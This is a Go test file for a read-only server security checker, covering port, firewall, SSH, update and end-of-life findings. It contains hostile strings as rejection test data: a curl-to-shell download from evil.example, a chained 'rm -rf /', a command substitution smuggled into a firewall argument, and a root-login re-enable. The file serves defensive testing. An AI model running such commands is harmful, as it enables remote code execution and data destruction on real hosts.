package hostcheck

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	hc "github.com/deutschland-schild/schild/contract/hostcheck"
)

var fixtureNow = time.Date(2026, 10, 27, 12, 0, 0, 0, time.UTC)

var fixtureHosts = []string{"debian12", "debian11", "debian9", "ubuntu2204", "ubuntu2404", "rocky9", "alma9", "centos7"}

func fixtureRole(h string) string {
	if h == "debian12" || h == "ubuntu2404" {
		return hc.RoleGateway
	}
	return hc.RoleAgent
}

var fixtureApps = []string{"/var/www/shop", "/var/www/cloud", "/srv/api", "/var/www/typo3"}

func runFixture(t testing.TB, h string) (*hc.Report, *FixtureEnv) {
	t.Helper()
	env := &FixtureEnv{Dir: filepath.Join("testdata", "hosts", h), Time: fixtureNow}
	r := Run(context.Background(), env, Options{Role: fixtureRole(h), AgentKeyID: h + "/agent/2026-10", SchildVersion: "0.1.0-alpha", Apps: fixtureApps})
	return r, env
}

// expectations: "id|subject" -> "status/severity[/reason/needs]". Every
// result of every fixture is listed, so a new or changed result fails.
var expectations = map[string]map[string]string{
	"debian12": {
		"distribution.eol|":                           "finding/low",
		"distribution.kernel_outdated|":               "finding/medium",
		"updates.security_pending|":                   "finding/high",
		"updates.pending|":                            "finding/low",
		"updates.automatic|":                          "ok/info",
		"updates.reboot_required|":                    "finding/medium",
		"ports.public_service|tcp/22":                 "ok/info",
		"ports.public_service|tcp/80":                 "ok/info",
		"ports.public_service|tcp/443":                "ok/info",
		"ports.public_service|tcp/3306":               "finding/high",
		"ports.docker_api|":                           "ok/info",
		"ports.admin_panel|":                          "ok/info",
		"firewall.active|":                            "ok/info",
		"firewall.default_incoming|":                  "ok/info",
		"firewall.docker_bypass|":                     "finding/medium",
		"ssh.password_authentication|":                "ok/info",
		"ssh.permit_root_login|":                      "ok/info",
		"ssh.port|":                                   "ok/info",
		"ssh.failed_logins|":                          "ok/info",
		"tls.certificate_expiry|api.example":          "ok/info",
		"tls.certificate_expiry|old.example":          "finding/critical",
		"tls.certificate_expiry|shop.example":         "finding/medium",
		"tls.certificate_expiry|wildcard.example.net": "finding/high",
		"software.runtime_eol|php-8.2":                "ok/info",
		"software.database_eol|postgresql-15":         "ok/info",
		"software.runtime_eol|python-3.11":            "ok/info",
		"software.server_eol|":                        "ok/info",
		"software.app_outdated|path:/var/www/shop":    "ok/info",
		"software.app_outdated|path:/var/www/cloud":   "unreadable/info/not_installed/",
		"software.app_outdated|path:/srv/api":         "unreadable/info/not_installed/",
		"software.app_outdated|path:/var/www/typo3":   "unreadable/info/not_installed/",
	},
	"debian11": {
		"distribution.eol|":                         "finding/high",
		"distribution.kernel_outdated|":             "ok/info",
		"updates.security_pending|":                 "ok/info",
		"updates.pending|":                          "ok/info",
		"updates.automatic|":                        "finding/medium",
		"updates.reboot_required|":                  "ok/info",
		"ports.public_service|tcp/22":               "ok/info",
		"ports.public_service|tcp/80":               "ok/info",
		"ports.public_service|tcp/6379":             "finding/high",
		"ports.public_service|tcp/8080":             "ok/info",
		"ports.docker_api|":                         "ok/info",
		"ports.admin_panel|":                        "ok/info",
		"firewall.active|":                          "unreadable/info/permission_denied/CAP_NET_ADMIN",
		"firewall.default_incoming|":                "unreadable/info/permission_denied/CAP_NET_ADMIN",
		"firewall.docker_bypass|":                   "ok/info",
		"ssh.password_authentication|":              "finding/medium",
		"ssh.permit_root_login|":                    "finding/high",
		"ssh.port|":                                 "ok/info",
		"ssh.failed_logins|":                        "unreadable/info/permission_denied/group:adm",
		"software.database_eol|mariadb-10.5":        "finding/high",
		"software.runtime_eol|php-7.4":              "finding/high",
		"software.server_eol|":                      "ok/info",
		"software.app_outdated|path:/var/www/shop":  "unreadable/info/not_installed/",
		"software.app_outdated|path:/var/www/cloud": "finding/high",
		"software.app_outdated|path:/srv/api":       "unreadable/info/not_installed/",
		"software.app_outdated|path:/var/www/typo3": "unreadable/info/not_installed/",
	},
	"debian9": {
		"distribution.eol|":                         "finding/high",
		"distribution.kernel_outdated|":             "ok/info",
		"updates.security_pending|":                 "ok/info",
		"updates.pending|":                          "ok/info",
		"updates.automatic|":                        "finding/medium",
		"updates.reboot_required|":                  "ok/info",
		"ports.public_service|tcp/22":               "ok/info",
		"ports.public_service|tcp/80":               "ok/info",
		"ports.public_service|tcp/3306":             "finding/high",
		"ports.admin_panel|tcp/10000":               "finding/medium",
		"ports.docker_api|":                         "ok/info",
		"firewall.active|":                          "finding/high",
		"firewall.default_incoming|":                "finding/medium",
		"firewall.docker_bypass|":                   "ok/info",
		"ssh.password_authentication|":              "finding/medium",
		"ssh.permit_root_login|":                    "finding/high",
		"ssh.port|":                                 "ok/info",
		"ssh.failed_logins|":                        "finding/medium",
		"software.runtime_eol|php-7.0":              "finding/high",
		"software.runtime_eol|python-2.7":           "finding/high",
		"software.server_eol|":                      "ok/info",
		"software.database_eol|":                    "ok/info",
		"software.app_outdated|path:/var/www/shop":  "unreadable/info/not_installed/",
		"software.app_outdated|path:/var/www/cloud": "unreadable/info/not_installed/",
		"software.app_outdated|path:/srv/api":       "unreadable/info/not_installed/",
		"software.app_outdated|path:/var/www/typo3": "unreadable/info/not_installed/",
	},
	"ubuntu2204": {
		"distribution.eol|":                         "ok/info",
		"distribution.kernel_outdated|":             "ok/info",
		"updates.security_pending|":                 "finding/high",
		"updates.pending|":                          "finding/low",
		"updates.automatic|":                        "finding/medium",
		"updates.reboot_required|":                  "ok/info",
		"ports.public_service|tcp/22":               "ok/info",
		"ports.admin_panel|tcp/3000":                "finding/medium",
		"ports.public_service|tcp/5432":             "finding/high",
		"ports.public_service|tcp/8000":             "finding/low",
		"ports.docker_api|":                         "ok/info",
		"firewall.active|":                          "finding/high",
		"firewall.default_incoming|":                "finding/medium",
		"firewall.docker_bypass|":                   "ok/info",
		"ssh.password_authentication|":              "finding/medium",
		"ssh.permit_root_login|":                    "ok/info",
		"ssh.port|":                                 "ok/info",
		"ssh.failed_logins|":                        "finding/medium",
		"software.runtime_eol|node-18":              "finding/low",
		"software.runtime_eol|php-8.1":              "finding/low",
		"software.database_eol|postgresql-14":       "ok/info",
		"software.runtime_eol|python-3.10":          "finding/low", // Python 3.10 EOL 2026-10-01 (endoflife.date)
		"software.server_eol|":                      "ok/info",
		"software.app_outdated|path:/var/www/shop":  "unreadable/info/not_installed/",
		"software.app_outdated|path:/var/www/cloud": "unreadable/info/not_installed/",
		"software.app_outdated|path:/srv/api":       "finding/high",
		"software.app_outdated|path:/var/www/typo3": "unreadable/info/not_installed/",
	},
	"ubuntu2404": {
		"distribution.eol|":                         "ok/info",
		"distribution.kernel_outdated|":             "ok/info",
		"updates.security_pending|":                 "finding/high",
		"updates.pending|":                          "ok/info",
		"updates.automatic|":                        "ok/info",
		"updates.reboot_required|":                  "ok/info",
		"ports.public_service|tcp/22":               "ok/info",
		"ports.public_service|tcp/443":              "ok/info",
		"ports.docker_api|tcp/2375":                 "finding/critical",
		"ports.admin_panel|tcp/9443":                "finding/medium",
		"firewall.active|":                          "ok/info",
		"firewall.default_incoming|":                "ok/info",
		"firewall.docker_bypass|":                   "unreadable/info/permission_denied/CAP_NET_ADMIN",
		"ssh.password_authentication|":              "ok/info",
		"ssh.permit_root_login|":                    "ok/info",
		"ssh.port|":                                 "ok/info",
		"ssh.failed_logins|":                        "unreadable/info/permission_denied/group:adm",
		"tls.certificate_expiry|":                   "unreadable/info/permission_denied/root",
		"software.runtime_eol|php-8.3":              "ok/info",
		"software.server_eol|":                      "ok/info",
		"software.database_eol|":                    "ok/info",
		"software.app_outdated|path:/var/www/shop":  "unreadable/info/not_installed/",
		"software.app_outdated|path:/var/www/cloud": "unreadable/info/not_installed/",
		"software.app_outdated|path:/srv/api":       "unreadable/info/not_installed/",
		"software.app_outdated|path:/var/www/typo3": "unreadable/info/not_installed/",
	},
	"rocky9": {
		"distribution.eol|":                         "ok/info",
		"distribution.kernel_outdated|":             "finding/medium",
		"updates.security_pending|":                 "finding/high",
		"updates.pending|":                          "finding/low",
		"updates.automatic|":                        "ok/info",
		"updates.reboot_required|":                  "finding/medium",
		"ports.public_service|tcp/22":               "ok/info",
		"ports.public_service|tcp/80":               "ok/info",
		"ports.public_service|tcp/3306":             "finding/high",
		"ports.public_service|tcp/9100":             "ok/info",
		"ports.docker_api|":                         "ok/info",
		"ports.admin_panel|":                        "ok/info",
		"firewall.active|":                          "ok/info",
		"firewall.default_incoming|":                "ok/info",
		"firewall.docker_bypass|":                   "ok/info",
		"ssh.password_authentication|":              "finding/medium",
		"ssh.permit_root_login|":                    "finding/high",
		"ssh.port|":                                 "ok/info",
		"ssh.failed_logins|":                        "ok/info",
		"software.database_eol|mariadb-10.5":        "finding/low",
		"software.runtime_eol|php-8.0":              "finding/low",
		"software.runtime_eol|python-3.9":           "finding/low",
		"software.server_eol|":                      "ok/info",
		"software.app_outdated|path:/var/www/shop":  "unreadable/info/not_installed/",
		"software.app_outdated|path:/var/www/cloud": "unreadable/info/not_installed/",
		"software.app_outdated|path:/srv/api":       "unreadable/info/not_installed/",
		"software.app_outdated|path:/var/www/typo3": "finding/high",
	},
	"alma9": {
		"distribution.eol|":                         "ok/info",
		"distribution.kernel_outdated|":             "unreadable/info/permission_denied/root",
		"updates.pending|":                          "unreadable/info/not_configured/",
		"updates.security_pending|":                 "unreadable/info/not_configured/",
		"updates.automatic|":                        "finding/medium",
		"updates.reboot_required|":                  "ok/info",
		"ports.public_service|tcp/22":               "ok/info",
		"ports.public_service|tcp/80":               "ok/info",
		"ports.public_service|tcp/443":              "ok/info",
		"ports.docker_api|":                         "ok/info",
		"ports.admin_panel|":                        "ok/info",
		"firewall.active|":                          "ok/info",
		"firewall.default_incoming|":                "ok/info",
		"firewall.docker_bypass|":                   "ok/info",
		"ssh.password_authentication|":              "unreadable/info/permission_denied/root",
		"ssh.permit_root_login|":                    "unreadable/info/permission_denied/root",
		"ssh.port|":                                 "unreadable/info/permission_denied/root",
		"ssh.failed_logins|":                        "unreadable/info/permission_denied/root",
		"software.runtime_eol|node-20":              "finding/high",
		"software.runtime_eol|php-8.1":              "finding/low",
		"software.server_eol|":                      "ok/info",
		"software.database_eol|":                    "ok/info",
		"software.app_outdated|path:/var/www/shop":  "unreadable/info/not_installed/",
		"software.app_outdated|path:/var/www/cloud": "unreadable/info/not_installed/",
		"software.app_outdated|path:/srv/api":       "unreadable/info/not_installed/",
		"software.app_outdated|path:/var/www/typo3": "unreadable/info/not_installed/",
	},
	"centos7": {
		"distribution.eol|":                         "finding/high",
		"distribution.kernel_outdated|":             "ok/info",
		"updates.security_pending|":                 "unreadable/info/not_supported/",
		"updates.pending|":                          "unreadable/info/not_supported/",
		"updates.automatic|":                        "finding/medium",
		"updates.reboot_required|":                  "finding/medium",
		"ports.public_service|tcp/22":               "ok/info",
		"ports.public_service|tcp/8080":             "finding/low",
		"ports.docker_api|":                         "ok/info",
		"ports.admin_panel|":                        "ok/info",
		"firewall.active|":                          "ok/info",
		"firewall.default_incoming|":                "ok/info",
		"firewall.docker_bypass|":                   "ok/info",
		"ssh.password_authentication|":              "finding/medium",
		"ssh.permit_root_login|":                    "finding/high",
		"ssh.port|":                                 "ok/info",
		"ssh.failed_logins|":                        "ok/info",
		"software.runtime_eol|python-2.7":           "finding/high",
		"software.server_eol|tomcat-7":              "finding/high",
		"software.database_eol|":                    "ok/info",
		"software.app_outdated|path:/var/www/shop":  "unreadable/info/not_installed/",
		"software.app_outdated|path:/var/www/cloud": "unreadable/info/not_installed/",
		"software.app_outdated|path:/srv/api":       "unreadable/info/not_installed/",
		"software.app_outdated|path:/var/www/typo3": "unreadable/info/not_installed/",
	},
}

func TestFixtureHosts(t *testing.T) {
	for _, h := range fixtureHosts {
		t.Run(h, func(t *testing.T) {
			r, _ := runFixture(t, h)
			b, err := Marshal(r)
			if err != nil {
				t.Fatalf("report fails the contract: %v", err)
			}
			got := map[string]string{}
			for _, f := range r.Findings {
				if f.Evidence.Source == "" {
					t.Errorf("%s %s: no evidence source", f.ID, f.Subject)
				}
				if f.Area == areaLogs {
					continue // area logs: own fixture trees (logs_test.go)
				}
				v := f.Status + "/" + f.Severity
				if f.Unreadable != nil {
					v += "/" + f.Unreadable.Reason + "/" + f.Unreadable.Needs
				}
				got[f.ID+"|"+f.Subject] = v
				if f.Status == hc.StatusFinding && f.FixCommand == nil && f.Severity == "critical" && f.ID != "ports.docker_api" && f.ID != "tls.certificate_expiry" {
					t.Errorf("%s: critical finding without fix command", f.ID)
				}
				if f.Evidence.Source == "" {
					t.Errorf("%s %s: no evidence source", f.ID, f.Subject)
				}
			}
			want := expectations[h]
			for k, v := range want {
				if got[k] != v {
					t.Errorf("%s: got %q, want %q", k, got[k], v)
				}
			}
			for k, v := range got {
				if _, ok := want[k]; !ok {
					t.Errorf("unexpected result %s = %s", k, v)
				}
			}
			// Areas every host reports.
			for _, a := range []string{"distribution", "updates", "ports", "firewall", "ssh", "software"} {
				if !strings.Contains(string(b), `"area":"`+a+`"`) {
					t.Errorf("area %s missing", a)
				}
			}
			if r.Host.Role == hc.RoleAgent && strings.Contains(string(b), `"area":"tls"`) {
				t.Error("agents never check TLS (gateway only)")
			}
		})
	}
}

// TestNoSecretsInReports: fixture files hold canaries (wp-config.php
// DB_PASSWORD, Laravel .env, Nextcloud config.php, a key file next to a
// certificate). Nothing of them may reach a report.
func TestNoSecretsInReports(t *testing.T) {
	for _, h := range fixtureHosts {
		r, _ := runFixture(t, h)
		b, err := Marshal(r)
		if err != nil {
			t.Fatal(err)
		}
		for _, canary := range []string{"fixture-not-a-secret", "DB_PASSWORD", "APP_KEY", "not a real key", "BEGIN", "dbpassword", "203.0.113.5 port", "Failed password"} {
			if strings.Contains(string(b), canary) {
				t.Errorf("%s: report contains %q", h, canary)
			}
		}
		if err := hc.CheckForbidden(mustGeneric(t, b)); err != nil {
			t.Errorf("%s: %v", h, err)
		}
	}
}

func mustGeneric(t *testing.T, b []byte) map[string]any {
	var v map[string]any
	if err := json.Unmarshal(b, &v); err != nil {
		t.Fatal(err)
	}
	return v
}

// TestOnlyReadOnlyCommands: the env refuses anything not on the list, and
// the list holds no command that changes state or refreshes indexes.
func TestOnlyReadOnlyCommands(t *testing.T) {
	bad := []string{"update", "upgrade", "install", "makecache", "refresh", "remove", "enable", "disable", "start", "stop", "restart", "reload", "-y", "--assumeyes", "flush", "delete", "add", "set"}
	for _, c := range Commands {
		for _, a := range c.Argv {
			for _, b := range bad {
				if a == b {
					t.Errorf("%s: argument %q", c.ID, a)
				}
			}
		}
		if c.Argv[0] == "apt-get" && !contains(c.Argv, "-s") {
			t.Errorf("apt-get without -s")
		}
		if (c.Argv[0] == "dnf" || c.Argv[0] == "yum") && !contains(c.Argv, "-C") {
			t.Errorf("%s without -C (cache only)", c.ID)
		}
	}
	env := &FixtureEnv{Dir: "testdata/hosts/debian12", Time: fixtureNow}
	if _, err := env.Run(context.Background(), Command{ID: "evil", Argv: []string{"apt", "update"}}); err != ErrRefused {
		t.Fatalf("got %v", err)
	}
	if _, err := env.Run(context.Background(), Command{ID: CmdAptUpgradable.ID, Argv: []string{"apt", "upgrade"}}); err != ErrRefused {
		t.Fatalf("argv mismatch: got %v", err)
	}
	if _, err := (OSEnv{}).Run(context.Background(), Command{ID: "rm", Argv: []string{"rm", "-rf", "/tmp/x"}}); err != ErrRefused {
		t.Fatalf("OSEnv: got %v", err)
	}
	// Every command a fixture run uses is on the list.
	for _, h := range fixtureHosts {
		_, e := runFixture(t, h)
		for _, id := range e.Ran {
			found := false
			for _, c := range Commands {
				found = found || c.ID == id
			}
			if !found {
				t.Errorf("%s ran %s", h, id)
			}
		}
	}
}

func contains(xs []string, s string) bool {
	for _, x := range xs {
		if x == s {
			return true
		}
	}
	return false
}

func TestPrivilegeDowngrade(t *testing.T) {
	// The same host as root and without root: without root the ruleset is
	// unreadable, never a failure of the run.
	no := false
	env := &FixtureEnv{Dir: "testdata/hosts/ubuntu2404", Time: fixtureNow, Root: &no}
	r := Run(context.Background(), env, Options{Role: hc.RoleGateway})
	if r.Run.AsRoot {
		t.Fatal("as_root")
	}
	if _, err := Marshal(r); err != nil {
		t.Fatal(err)
	}
	n := Count(r)
	if n.Unreadable < 3 {
		t.Fatalf("unreadable %d", n.Unreadable)
	}
}

func TestParsers(t *testing.T) {
	ls := ParseSS([]byte("State Recv-Q Send-Q Local Address:Port Peer Address:Port Process\nLISTEN 0 128 [::ffff:127.0.0.1]:8080 *:*\nLISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:*\nLISTEN 0 5 [fe80::1%eth0]:9000 [::]:* users:((\"x\",pid=1,fd=2))\nESTAB 0 0 10.0.0.1:22 10.0.0.2:5000\n"))
	if len(ls) != 3 || exposure(ls[0].Addr) != exposeLoopback || exposure(ls[1].Addr) != exposeLoopback || exposure(ls[2].Addr) != exposeInternal || ls[2].Process != "x" {
		t.Fatalf("%+v", ls)
	}
	p := ParseProcNetTCP([]byte("sl local rem st\n 0: 0100007F:1F90 00000000:0000 0A 0 0 0\n 1: 00000000:0016 00000000:0000 0A\n 2: 0500000A:0016 0A00000A:D431 01\n"), false)
	if len(p) != 2 || p[0].Addr != "127.0.0.1" || p[0].Port != 8080 || p[1].Addr != "0.0.0.0" || p[1].Port != 22 {
		t.Fatalf("%+v", p)
	}
	p6 := ParseProcNetTCP([]byte(" 0: 00000000000000000000000001000000:0050 0000:0 0A\n"), true)
	if len(p6) != 1 || p6[0].Addr != "::1" {
		t.Fatalf("%+v", p6)
	}
	ups := ParseAptSimulate([]byte("NOTE: This is only a simulation!\nInst libssl3 [3.0.14-1~deb12u2] (3.0.15-1~deb12u1 Debian-Security:12/stable-security [amd64])\nInst tzdata [2024a-0+deb12u1] (2024b-0+deb12u1 Debian:12.7/stable-updates [all])\nConf libssl3 (3.0.15-1~deb12u1 Debian-Security:12/stable-security [amd64])\n"))
	if len(ups) != 2 || !ups[0].Security || ups[1].Security || ups[0].Installed != "3.0.14-1~deb12u2" {
		t.Fatalf("%+v", ups)
	}
	r := ParseIptablesSave([]byte("*filter\n:INPUT DROP [0:0]\n:DOCKER-USER - [0:0]\n-A DOCKER-USER -s 10.0.0.0/8 -j ACCEPT\n-A DOCKER-USER -j RETURN\nCOMMIT\n"))
	if r.InputPolicy != "drop" || !r.Docker || r.DockerUserRules != 1 {
		t.Fatalf("%+v", r)
	}
	set := ParseSshdT([]byte("port 2222\nPasswordAuthentication no\npermitrootlogin no\n"))
	if set["port"] != "2222" || set["passwordauthentication"] != "no" {
		t.Fatalf("%v", set)
	}
	if n := CountFailedSSH([]byte("Oct 27 10:00:00 h sshd[1]: Invalid user a from 192.0.2.1 port 1\nOct 27 10:00:01 h sshd[1]: Failed password for invalid user a from 192.0.2.1 port 1 ssh2\nOct 25 10:00:00 h sshd[1]: Failed password for root from 192.0.2.1 port 1 ssh2\nOct 27 11:00:00 h sshd[2]: Failed password for root from 192.0.2.1 port 1 ssh2\nOct 27 11:00:00 h cron[2]: Failed password for root\n"), fixtureNow.Add(-24*time.Hour), fixtureNow); n != 2 {
		t.Fatalf("count %d", n)
	}
}

func TestCompareVersions(t *testing.T) {
	for _, c := range []struct {
		a, b string
		want int
	}{
		{"1.0", "1.0", 0}, {"1.0~rc1", "1.0", -1}, {"2:1.0", "1:9.9", 1}, {"1.10", "1.9", 1}, {"6.1.0-26-amd64", "6.1.0-25-amd64", 1},
		{"5.14.0-427.33.1.el9_4.x86_64", "5.14.0-427.13.1.el9_4.x86_64", 1}, {"3.0.15-1~deb12u1", "3.0.14-1~deb12u2", 1}, {"1.0a", "1.0", 1}, {"1.0", "1.0.0", -1},
	} {
		if got := CompareVersions(c.a, c.b); got != c.want {
			t.Errorf("%s vs %s: %d", c.a, c.b, got)
		}
		if got := CompareVersions(c.b, c.a); got != -c.want {
			t.Errorf("%s vs %s (reverse): %d", c.b, c.a, got)
		}
	}
	if Upstream("2:8.2.7-1~deb12u1") != "8.2.7" || Cycle("10.11.6-0+deb12u1", 2) != "10.11" || javaMajor("1.8.0") != "8" || javaMajor("17.0.12") != "17" {
		t.Fatal("upstream/cycle")
	}
}

func TestEOLTable(t *testing.T) {
	tb := Table()
	if _, err := time.Parse("2006-01-02", tb.Date); err != nil || tb.Source == "" {
		t.Fatal("table needs date and source")
	}
	if e := tb.LookupOS("rocky", "9.4", ""); e == nil || e.EOL != "2032-05-31" {
		t.Fatal("rocky 9")
	}
	if e := tb.LookupOS("centos", "8", "CentOS Stream 8"); e == nil || e.EOL != "2024-05-31" {
		t.Fatal("stream")
	}
	if tb.LookupOS("ubuntu", "23.04", "") != nil {
		t.Fatal("unknown release must be nil")
	}
	for _, o := range tb.OS {
		if _, err := time.Parse("2006-01-02", o.EOL); err != nil {
			t.Errorf("%s %s: %v", o.ID, o.Version, err)
		}
		if o.Extended != "" && o.Extended < o.EOL {
			t.Errorf("%s %s: extended before eol", o.ID, o.Version)
		}
	}
	for _, s := range tb.Software {
		if _, err := time.Parse("2006-01-02", s.EOL); err != nil {
			t.Errorf("%s %s: %v", s.Name, s.Cycle, err)
		}
	}
}

func TestWriteListPrune(t *testing.T) {
	dir := filepath.Join(t.TempDir(), "host-check")
	var last string
	for i := 0; i < 5; i++ {
		r, _ := runFixture(t, "debian12")
		r.Run.StartedAt = fixtureNow.Add(time.Duration(i) * time.Minute).Format("2006-01-02T15:04:05Z")
		b, err := Marshal(r)
		if err != nil {
			t.Fatal(err)
		}
		p, err := WriteReport(dir, r, b, 3)
		if err != nil {
			t.Fatal(err)
		}
		last = p
		st, _ := os.Stat(p)
		if st.Mode().Perm() != 0o640 {
			t.Fatalf("mode %v", st.Mode())
		}
	}
	_ = os.WriteFile(filepath.Join(dir, "notes.txt"), []byte("x"), 0o600)
	names, err := List(dir)
	if err != nil || len(names) != 3 || filepath.Join(dir, names[0]) != last {
		t.Fatalf("%v %v", names, err)
	}
	raw, r, err := ReadReport(last)
	if err != nil || r.Host.Hostname != "gw-1.example" || len(raw) == 0 {
		t.Fatal(err)
	}
	if es, _ := os.ReadDir(dir); len(es) != 4 {
		t.Fatalf("temp files left: %d entries", len(es))
	}
}

func TestReportRejectsSecrets(t *testing.T) {
	r, _ := runFixture(t, "debian12")
	r.Findings[0].Explanation = "DB_PASSWORD=hunter2"
	if _, err := Marshal(r); err == nil {
		t.Fatal("a finding with a secret must never be written")
	}
}

// TestConcurrentRuns: runs share nothing mutable (race detector).
func TestConcurrentRuns(t *testing.T) {
	var wg sync.WaitGroup
	for i := 0; i < 8; i++ {
		wg.Add(1)
		go func(h string) {
			defer wg.Done()
			r, _ := runFixture(t, h)
			if _, err := Marshal(r); err != nil {
				t.Error(err)
			}
		}(fixtureHosts[i%len(fixtureHosts)])
	}
	wg.Wait()
}

// TestRHELReadOnlyUpdates: pending and security updates come from the
// hawkey script's output, the reboot rule from install times vs. boot time;
// dnf, yum and needs-restarting are never run.
func TestRHELReadOnlyUpdates(t *testing.T) {
	r, env := runFixture(t, "rocky9")
	for _, id := range env.Ran {
		if strings.HasPrefix(id, "dnf-check") || strings.HasPrefix(id, "yum") || strings.HasPrefix(id, "needs-") {
			t.Fatalf("ran %s", id)
		}
	}
	got := map[string][]string{}
	for _, f := range r.Findings {
		if f.Area == "updates" {
			got[f.ID] = f.Evidence.Packages
		}
	}
	if s := strings.Join(got["updates.security_pending"], ","); s != "kernel,openssl,openssl-libs" {
		t.Errorf("security packages %q", s)
	}
	if s := strings.Join(got["updates.pending"], ","); s != "NetworkManager,vim-minimal" && s != "networkmanager,vim-minimal" && s != "vim-minimal" {
		t.Errorf("other packages %q", s)
	}
	if s := strings.Join(got["updates.reboot_required"], ","); s != "kernel,kernel-core" {
		t.Errorf("reboot packages %q", s)
	}
	ups, ok := ParseDnfUpdates([]byte("schild-dnf-updates 1\nrepos\t1\nu\tglibc\tx86_64\t2.34-1\t0\nu\tglibc\ti686\t2.34-1\t1\n"))
	if !ok || len(ups) != 1 || !ups[0].Security {
		t.Fatalf("%+v %v", ups, ok)
	}
	if _, ok := ParseDnfUpdates([]byte("Last metadata expiration check\n")); ok {
		t.Fatal("foreign output accepted")
	}
}

// TestJavaVersionFromReleaseFile: a tarball JDK linked into PATH is
// inventoried from <java home>/release; no JVM is started.
func TestJavaVersionFromReleaseFile(t *testing.T) {
	dir := t.TempDir()
	if err := os.CopyFS(dir, os.DirFS("testdata/hosts/debian12")); err != nil {
		t.Fatal(err)
	}
	mk := func(rel, body string) {
		p := filepath.Join(dir, "fs", rel)
		_ = os.MkdirAll(filepath.Dir(p), 0o755)
		if err := os.WriteFile(p, []byte(body), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	mk("opt/jre/bin/java", "")
	mk("opt/jre/release", "IMPLEMENTOR=\"Eclipse Adoptium\"\nJAVA_VERSION=\"11.0.22\"\n")
	_ = os.MkdirAll(filepath.Join(dir, "fs/usr/local/bin"), 0o755)
	if err := os.Symlink("/opt/jre/bin/java", filepath.Join(dir, "fs/usr/local/bin/java")); err != nil {
		t.Fatal(err)
	}
	env := &FixtureEnv{Dir: dir, Time: fixtureNow}
	r := Run(context.Background(), env, Options{Role: hc.RoleAgent, AgentKeyID: "x/agent/2026-10", SchildVersion: "t"})
	found := false
	for _, it := range r.Inventory {
		if it.Name == "java" && it.Version == "11.0.22" && it.Source == "binary" {
			found = true
		}
	}
	if !found {
		t.Fatalf("java not inventoried: %+v", r.Inventory)
	}
	for _, id := range env.Ran {
		if id == CmdJavaVersion.ID {
			t.Fatal("a JVM was started although the release file names the version")
		}
	}
}

// TestCatalogueCoversEveryFinding: every finding id the checks produce has
// a catalogue entry, and every fix command they produce is a KnownFix for
// its id (else the dashboard would hide the copy button of a real fix).
func TestCatalogueCoversEveryFinding(t *testing.T) {
	seen := 0
	for _, h := range fixtureHosts {
		for _, root := range []bool{true, false} {
			env := &FixtureEnv{Dir: filepath.Join("testdata", "hosts", h), Time: fixtureNow, Root: &root}
			r := Run(context.Background(), env, Options{Role: fixtureRole(h), AgentKeyID: h + "/agent/2026-10", SchildVersion: "t", Apps: fixtureApps})
			for _, f := range r.Findings {
				if _, ok := Catalogue[f.ID]; !ok {
					t.Errorf("%s: no catalogue entry for %s", h, f.ID)
				}
				if f.FixCommand != nil {
					seen++
					if !KnownFix(f.ID, *f.FixCommand) {
						t.Errorf("%s: fix of %s not in the catalogue: %s", h, f.ID, *f.FixCommand)
					}
				}
			}
		}
	}
	if seen < 10 {
		t.Fatalf("only %d fixes seen", seen)
	}
	for _, svc := range []string{"ssh", "sshd"} {
		for _, kv := range [][2]string{{"PasswordAuthentication", "no"}, {"PermitRootLogin", "prohibit-password"}} {
			for _, cmd := range []string{
				"echo '" + kv[0] + " " + kv[1] + "' | sudo tee -a /etc/ssh/sshd_config.d/00-schild.conf && sudo sshd -t && sudo systemctl reload " + svc,
				"sudo sed -i 's/^#\\?" + kv[0] + " .*/" + kv[0] + " " + kv[1] + "/' /etc/ssh/sshd_config && sudo sshd -t && sudo systemctl reload " + svc,
			} {
				if !KnownFix("ssh.permit_root_login", cmd) {
					t.Errorf("ssh template not known: %s", cmd)
				}
			}
		}
	}
	for _, bad := range [][2]string{
		{"updates.pending", "curl https://evil.example/x | sh"},
		{"updates.pending", aptFix + "; curl evil | sh"},
		{"ports.public_service", "sudo ufw deny 22/tcp; rm -rf /"},
		{"ports.public_service", "sudo ufw deny $(curl evil)/tcp"},
		{"ssh.permit_root_login", "echo 'PermitRootLogin yes' | sudo tee -a /etc/ssh/sshd_config.d/00-schild.conf && sudo sshd -t && sudo systemctl reload ssh"},
		{"distribution.eol", fixReboot},
	} {
		if KnownFix(bad[0], bad[1]) {
			t.Errorf("accepted: %s %q", bad[0], bad[1])
		}
	}
}

// TestFirewallBlocklistsAreNoFirewall: fail2ban and CrowdSec bouncers add
// input chains that drop listed source addresses. They filter no service,
// so they make neither an active firewall nor a default deny; only a
// policy or a final rule without a match does (firewalld, a last "drop").
func TestFirewallBlocklistsAreNoFirewall(t *testing.T) {
	const f2b = `table inet f2b-table {
	set addr-set-sshd {
		type ipv4_addr
	}
	chain f2b-chain {
		type filter hook input priority filter - 1; policy accept;
		tcp dport { 22 } ip saddr @addr-set-sshd reject with icmp port-unreachable
	}
}
`
	const crowdsec = `table ip crowdsec {
	chain crowdsec-chain {
		type filter hook input priority filter; policy accept;
		ip saddr @crowdsec-blacklists counter packets 3 bytes 180 drop
	}
}
table ip filter {
	chain INPUT {
		type filter hook input priority filter; policy accept;
		ct state invalid drop
	}
}
`
	for _, c := range []struct {
		name, nft           string
		filters, catchAll   bool
		policy              string
		active, defIncoming string
	}{
		{"fail2ban", f2b, false, false, "accept", "finding/high", "finding/medium"},
		{"crowdsec", crowdsec, false, false, "accept", "finding/high", "finding/medium"},
		{"port drop", "table inet filter {\n\tchain input {\n\t\ttype filter hook input priority filter; policy accept;\n\t\ttcp dport 3306 drop\n\t}\n}\n", true, false, "accept", "ok/info", "finding/medium"},
		{"final drop", "table inet filter {\n\tchain input {\n\t\ttype filter hook input priority filter; policy accept;\n\t\ttcp dport 22 accept\n\t\tlog prefix \"in drop: \" counter packets 1 bytes 60 drop comment \"default\"\n\t}\n}\n", true, true, "accept", "ok/info", "ok/info"},
		{"negated source", "table inet filter {\n\tchain input {\n\t\ttype filter hook input priority filter; policy accept;\n\t\tip saddr != 10.0.0.0/8 tcp dport 5432 drop\n\t}\n}\n", true, false, "accept", "ok/info", "finding/medium"},
	} {
		t.Run(c.name, func(t *testing.T) {
			r := ParseNft([]byte(c.nft))
			if r.InputFilters != c.filters || r.InputCatchAll != c.catchAll || r.InputPolicy != c.policy {
				t.Fatalf("%+v", r)
			}
			f := defaultDebian(t)
			f.file("/../cmd/nft.out", c.nft)
			fs := runFirewall(t, f.env())
